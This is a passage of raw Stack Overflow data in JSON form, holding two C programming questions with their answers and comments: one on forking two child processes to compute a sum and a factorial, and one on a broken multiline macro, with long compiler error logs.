"user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dc8c4ddd99b446c28d2e1546c457e508?s=128&d=identicon&r=PG", "display_name": "Alnitak", "link": "https://stackoverflow.com/users/6782/alnitak"}, "edited": false, "score": 0, "creation_date": 1517999746, "post_id": 48661200, "comment_id": 84320508, "body": "probably, yes.  The <code>return</code> is only OK if you&#39;re in <code>main</code> where it&#39;s equivalent to an implicit exit."}], "tags": [], "owner": {"reputation": 19910, "user_id": 8012646, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/T8yOZ.png?s=128&g=1", "display_name": "\u30ed\u30fc\u30a6", "link": "https://stackoverflow.com/users/8012646/%e3%83%ad%e3%83%bc%e3%82%a6"}, "is_accepted": false, "score": 2, "last_activity_date": 1517999068, "last_edit_date": 1517999068, "creation_date": 1517998679, "answer_id": 48661200, "question_id": 48660915, "link": "https://stackoverflow.com/questions/48660915/fork-two-child-process-one-to-compute-sum-of-n-and-the-other-the-factorial-of-n/48661200#48661200", "title": "Fork two child process, one to compute sum of N and the other the factorial of N", "body": "<p>I would suggest you first to create two separate functions, <code>sum()</code> and <code>fact()</code> that implement the tasks each respective child process should perform:</p>\n\n<pre><code>void sum(int num) { /* ... */ }\nvoid fact(int num) { /* ... */ }\n</code></pre>\n\n<p>Then, have pointer functions referring to those functions:</p>\n\n<pre><code>typedef (*child_task_t)(int);\n\nchild_task_t child_task[2];\nchild_task[0] = sum;\nchild_task[1] = fact;\n</code></pre>\n\n<p>That way, you can easily <code>fork()</code> to have two children by means of a <code>for</code>-loop:</p>\n\n<pre><code>for (int i = 0; i &lt; 2; i++) {\n   switch(fork()) {\n   case 0: // parent\n      continue;\n   case -1: // error\n      return -1;\n   default: // child\n      task_child[i](num); // &lt;-- run the task\n      exit(0); // child process finishes\n   }\n}\n\n// parent waits for the children to finish\nfor (int i = 0; i &lt; 2; i++)\n   wait(NULL);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "is_accepted": false, "score": 0, "last_activity_date": 1517998908, "creation_date": 1517998908, "answer_id": 48661278, "question_id": 48660915, "link": "https://stackoverflow.com/questions/48660915/fork-two-child-process-one-to-compute-sum-of-n-and-the-other-the-factorial-of-n/48661278#48661278", "title": "Fork two child process, one to compute sum of N and the other the factorial of N", "body": "<p>There is some problem in your code, I commented it:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n\nint main (int argc, char * argv[])\n{\n    pid_t ret;\n    int i, num,sum=0,fact=1;\n\n    ret=fork();\n    for (i=1; i &lt; argc; i++) {\n        num = atoi(argv[1]);\n    }\n    if (ret == 0) \n    {\n        /* in first child */\n        for(i=1;i&lt;=num;i++){\n            sum+=i;\n        }\n        printf(\"\\n [ ID = %d] sum of positive integers up to %d is %d\\n\",getpid(),num,sum);\n        /* here, you should exit from first child \n           with exit or return */\n\n    }\n    else\n    {\n        /* here, we are in parent */\n        if(fork()==0)\n        {\n            /* here, in second child */\n            for(i=1;i&lt;=num; i++){\n                fact*=i;    \n            }\n            printf(\"\\n [ ID = %d] Factorial of %d is %d\\n\",getpid(),num,fact);\n            /* here, you should exit from second child \n                with exit or return */\n\n        }\n\n        /* warning, second child and parent get there */\n        /* warning, here you only wait for one child */\n        wait(NULL);\n        printf(\"\\n[ID = %d] DONE\",getpid());\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>It's quite easy to simplify it:</p>\n\n<ul>\n<li>isolate childs' code</li>\n<li>identify which line will be executed by parent or child</li>\n<li>wait for childs </li>\n</ul>\n\n<p><br></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n\nint main (int argc, char * argv[])\n{\n    pid_t ret;\n    int i, num,sum=0,fact=1;\n\n    /* get parameter (you should test the value of argc before) */\n    num = atoi(argv[1]);    \n\n    /* create a first child */\n    if (0 == fork()) \n    {\n        /* in first child */\n        for(i=1;i&lt;=num;i++){\n            sum+=i;\n        }\n        printf(\"\\n [ ID = %d] sum of positive integers up to %d is %d\\n\",getpid(),num,sum);\n\n        /* exit from first child */\n        exit(0);    \n    }\n\n    /* this point will not be reached by first child */\n\n    /* create a second child */\n    if ( 0 == fork())\n    {\n        /* here, in second child */\n        for(i=1;i&lt;=num; i++){\n            fact*=i;    \n        }\n        printf(\"\\n [ ID = %d] Factorial of %d is %d\\n\",getpid(),num,fact);\n        /* exit from second child */\n        exit(0);           \n    }\n\n    /* this point will not be reached by second child */\n\n    /* wait for one child */\n    wait(NULL);\n\n    /* wait for a second child */\n    wait(NULL);\n\n    printf(\"\\n[ID = %d] DONE\",getpid());\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 83, "user_id": 7762023, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e25c5c2c3c1ade6f27ff3b796b65bf6a?s=128&d=identicon&r=PG&f=1", "display_name": "Yvette", "link": "https://stackoverflow.com/users/7762023/yvette"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 722, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1517999068, "creation_date": 1517997784, "question_id": 48660915, "link": "https://stackoverflow.com/questions/48660915/fork-two-child-process-one-to-compute-sum-of-n-and-the-other-the-factorial-of-n", "title": "Fork two child process, one to compute sum of N and the other the factorial of N", "body": "<p>I have to take an integer argument from the command line. Create two child processes. The first computes the sum of positive integers and the second the factorial. The parent must also wait for each child to finish, then the parent prints out \"done\" with its own identifier. </p>\n\n<p>an output example is</p>\n\n<pre><code>[ID = 101] Sum of positive integers up to 5 is 15\n[ID = 102] Factorial of 5 is 120\n[ID = 100] Done\n</code></pre>\n\n<p>but the output I am getting is</p>\n\n<pre><code> [ ID = 4262] Factorial of 5 is 120\n[ID = 4262] DONE\n[ID = 4260] DONE\n[ ID = 4261] sum of positive integers up to 5 is 15\n</code></pre>\n\n<p>This is my code</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n\nint main (int argc, char * argv[])\n{\npid_t ret;\nint i, num,sum=0,fact=1;\n\nret=fork();\n    for(i=1;i&lt;argc; i++){\n        num=atoi(argv[1]);\n\n    }\nif (ret == 0) {\n    for(i=1;i&lt;=num;i++){\n    sum+=i;\n    }\n    printf(\"\\n [ ID = %d] sum of positive integers up to %d is %d\\n\",getpid(),num,sum);\n}\n\nelse{\n    if(fork()==0){\n    for(i=1;i&lt;=num; i++){\n        fact*=i;    \n    }printf(\"\\n [ ID = %d] Factorial of %d is %d\\n\",getpid(),num,fact);\n    }\n    wait(NULL);\n    printf(\"\\n[ID = %d] DONE\",getpid());\n}\n\nreturn 0;\n}\n</code></pre>\n\n<p>My problem is that i'm not sure how to properly fork to have 2 child processes. </p>\n"}, {"tags": ["c", "macros"], "comments": [{"owner": {"reputation": 43, "user_id": 9193182, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/f50d333ab3a6c2b3745c187da782930b?s=128&d=identicon&r=PG&f=1", "display_name": "siods333333", "link": "https://stackoverflow.com/users/9193182/siods333333"}, "reply_to_user": {"reputation": 1956, "user_id": 4429015, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vqxqf.png?s=128&g=1", "display_name": "B001\u16e6", "link": "https://stackoverflow.com/users/4429015/b001%e1%9b%a6"}, "edited": false, "score": 0, "creation_date": 1517997901, "post_id": 48660904, "comment_id": 84319243, "body": "Syntax highlighting in my ide is wrong for it."}, {"owner": {"reputation": 1800, "user_id": 4769313, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/gFISt.png?s=128&g=1", "display_name": "Sir Jo Black", "link": "https://stackoverflow.com/users/4769313/sir-jo-black"}, "edited": false, "score": 0, "creation_date": 1517997914, "post_id": 48660904, "comment_id": 84319249, "body": "You have a lot of commented &quot;\\&quot; ... Try to use the comments using the syntax <code>&#47;* comment *&#47;</code> where &quot;comment&quot; is whatever you want!"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 4, "creation_date": 1517997919, "post_id": 48660904, "comment_id": 84319252, "body": "If ever there was a macro that should have been a function..."}, {"owner": {"reputation": 1052, "user_id": 3698648, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/199b49d13342baa233c08aac5793ed4d?s=128&d=identicon&r=PG&f=1", "display_name": "ntshetty", "link": "https://stackoverflow.com/users/3698648/ntshetty"}, "edited": false, "score": 1, "creation_date": 1517998168, "post_id": 48660904, "comment_id": 84319404, "body": "Replace all <code>&#47;&#47;&#47;&#47;lt</code> to <code>&#47;*lt*&#47;</code> , macro will be okay"}, {"owner": {"reputation": 43, "user_id": 9193182, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/f50d333ab3a6c2b3745c187da782930b?s=128&d=identicon&r=PG&f=1", "display_name": "siods333333", "link": "https://stackoverflow.com/users/9193182/siods333333"}, "edited": false, "score": 0, "creation_date": 1517998290, "post_id": 48660904, "comment_id": 84319483, "body": "Maybe i will make it a function, thought I can&#39;t properly pass *p around. My compiler is most likely too dumb to inline it properly."}, {"owner": {"reputation": 43, "user_id": 9193182, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/f50d333ab3a6c2b3745c187da782930b?s=128&d=identicon&r=PG&f=1", "display_name": "siods333333", "link": "https://stackoverflow.com/users/9193182/siods333333"}, "edited": false, "score": 0, "creation_date": 1517998348, "post_id": 48660904, "comment_id": 84319522, "body": "removed comments and empty lines, even more errors. Added to the post."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1517998648, "post_id": 48660904, "comment_id": 84319724, "body": "Please show how you use the <code>fill</code> macro, the problem may be <i>there</i>. Read this: <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 43, "user_id": 9193182, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/f50d333ab3a6c2b3745c187da782930b?s=128&d=identicon&r=PG&f=1", "display_name": "siods333333", "link": "https://stackoverflow.com/users/9193182/siods333333"}, "edited": false, "score": 0, "creation_date": 1517998808, "post_id": 48660904, "comment_id": 84319808, "body": "added 10 more to go..."}, {"owner": {"reputation": 7497, "user_id": 1213227, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/78179ef730f268752c0f6fdde3943b99?s=128&d=identicon&r=PG", "display_name": "Matthias", "link": "https://stackoverflow.com/users/1213227/matthias"}, "edited": false, "score": 1, "creation_date": 1517999929, "post_id": 48660904, "comment_id": 84320631, "body": "The macro ends with a `\\`, i.e., whatever comes next is part of the macro."}], "answers": [{"comments": [{"owner": {"reputation": 43, "user_id": 9193182, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/f50d333ab3a6c2b3745c187da782930b?s=128&d=identicon&r=PG&f=1", "display_name": "siods333333", "link": "https://stackoverflow.com/users/9193182/siods333333"}, "edited": false, "score": 0, "creation_date": 1518002171, "post_id": 48661726, "comment_id": 84322120, "body": "This helped greatly. Found the cause, there were spaces after <code>&#47;</code>."}], "tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": true, "score": 2, "last_activity_date": 1518000478, "last_edit_date": 1518000478, "creation_date": 1518000032, "answer_id": 48661726, "question_id": 48660904, "link": "https://stackoverflow.com/questions/48660904/why-this-multiline-macro-doesnt-work/48661726#48661726", "title": "Why this multiline macro doesn&#39;t work?", "body": "<p>You need to do this:</p>\n\n<ol>\n<li>Replace all <code>////xx</code> comments by <code>/* xx */</code></li>\n<li>Remove the stray space character after the <code>\\</code> in following line:</li>\n</ol>\n\n<hr>\n\n<pre><code>*p++ = where_l;                   \\ \n                                   ^ stray space here\n</code></pre>\n\n<hr>\n\n<p>This was not obvious because you cannot see that stray space unless you put the cursor there.</p>\n\n<ol start=\"3\">\n<li>Remove the final <code>\\</code> in the very last line of the macro:</li>\n</ol>\n\n<hr>\n\n<pre><code> *p++ = what_b;                   \\\n                                  ^ remove this\n</code></pre>\n\n<hr>\n\n<p><strong>Working example:</strong></p>\n\n<pre><code>#define fill(where_l, where_r, where_t, where_b, what_l, what_r, what_t, what_b) \\\n                                                                    \\\n    /*lt*/                                      \\\n    *p++ = where_l;                   \\\n    *p++ = where_t;                   \\\n    *p++ = 0.5f;                    \\\n    *p++ = 1.0f;                   \\\n    *p++ = what_l;                   \\\n    *p++ = what_t;                   \\\n    \\\n    /* rt */                  \\\n    *p++ = where_r;                   \\\n    *p++ = where_t;                   \\\n    *p++ = 0.5f;                   \\\n    *p++ = 1.0f;                   \\\n    *p++ = what_r;                   \\\n    *p++ = what_t;                   \\\n                   \\\n    /*lb*/                   \\\n    *p++ = where_l;                   \\\n    *p++ = where_b;                   \\\n    *p++ = 0.5f;                   \\\n    *p++ = 1.0f;                   \\\n    *p++ = what_l;                   \\\n    *p++ = what_b;                   \\\n                   \\\n    /*rb*/                   \\\n    *p++ = where_r;                   \\\n    *p++ = where_b;                   \\\n    *p++ = 0.5f;                   \\\n    *p++ = 1.0f;                   \\\n    *p++ = what_r;                   \\\n    *p++ = what_b;\n\nint main(int argc, char **argv) {\n\n  float* p = (float*)malloc(999);\n  fill(1, 2, 3, 4, 5, 6, 7, 8)\n}\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 9193182, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/f50d333ab3a6c2b3745c187da782930b?s=128&d=identicon&r=PG&f=1", "display_name": "siods333333", "link": "https://stackoverflow.com/users/9193182/siods333333"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 48661726, "answer_count": 1, "score": -1, "last_activity_date": 1518000478, "creation_date": 1517997748, "last_edit_date": 1517998780, "question_id": 48660904, "link": "https://stackoverflow.com/questions/48660904/why-this-multiline-macro-doesnt-work", "title": "Why this multiline macro doesn&#39;t work?", "body": "<p>Doesn't look like it was parced correctly even. But it looks fine to me.</p>\n\n<p>Maybe it doesn't like newlines? Tried without them.</p>\n\n<p>Maybe it must be in UPPER CASE? I honestly have no idea.</p>\n\n<p>Maybe it doesn't like ////comments?</p>\n\n<pre><code>#define fill(where_l, where_r, where_t, where_b, what_l, what_r, what_t, what_b) \\\n                                                                    \\\n    ////lt                                      \\\n    *p++ = where_l;                   \\  \n    *p++ = where_t;                   \\\n    *p++ = 0.5f;                    \\\n    *p++ = 1.0f;                   \\\n    *p++ = what_l;                   \\\n    *p++ = what_t;                   \\\n                                    \\\n    ////rt                   \\\n    *p++ = where_r;                   \\\n    *p++ = where_t;                   \\\n    *p++ = 0.5f;                   \\\n    *p++ = 1.0f;                   \\\n    *p++ = what_r;                   \\\n    *p++ = what_t;                   \\\n                   \\\n    ////lb                   \\\n    *p++ = where_l;                   \\\n    *p++ = where_b;                   \\\n    *p++ = 0.5f;                   \\\n    *p++ = 1.0f;                   \\\n    *p++ = what_l;                   \\\n    *p++ = what_b;                   \\\n                   \\\n    ////rb                   \\\n    *p++ = where_r;                   \\\n    *p++ = where_b;                   \\\n    *p++ = 0.5f;                   \\\n    *p++ = 1.0f;                   \\\n    *p++ = what_r;                   \\\n    *p++ = what_b;                   \\\n</code></pre>\n\n<p>Errors:</p>\n\n<pre><code>1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(569) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(569) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(570) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(570) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(570) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(569) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(571) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(571) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(571) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(569) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(572) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(572) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(572) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(569) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(573) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(573) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(573) : error C2086: 'int *p' : redefinition\n</code></pre>\n\n<p>Deleted comments completely, now errors are:</p>\n\n<pre><code>1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(569) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(569) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(569) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(570) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(570) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(570) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(571) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(571) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(571) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(572) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(572) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(572) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(574) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(574) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(574) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(575) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(575) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(575) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(576) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(576) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(576) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(577) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(577) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(577) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(578) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(578) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(578) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(579) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(579) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(579) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(581) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(581) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(581) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(582) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(582) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(582) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(583) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(583) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(583) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(584) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(584) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(584) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(585) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(585) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(585) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(586) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(586) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(586) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(588) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(588) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(588) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(589) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(589) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(589) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(590) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(590) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(590) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see 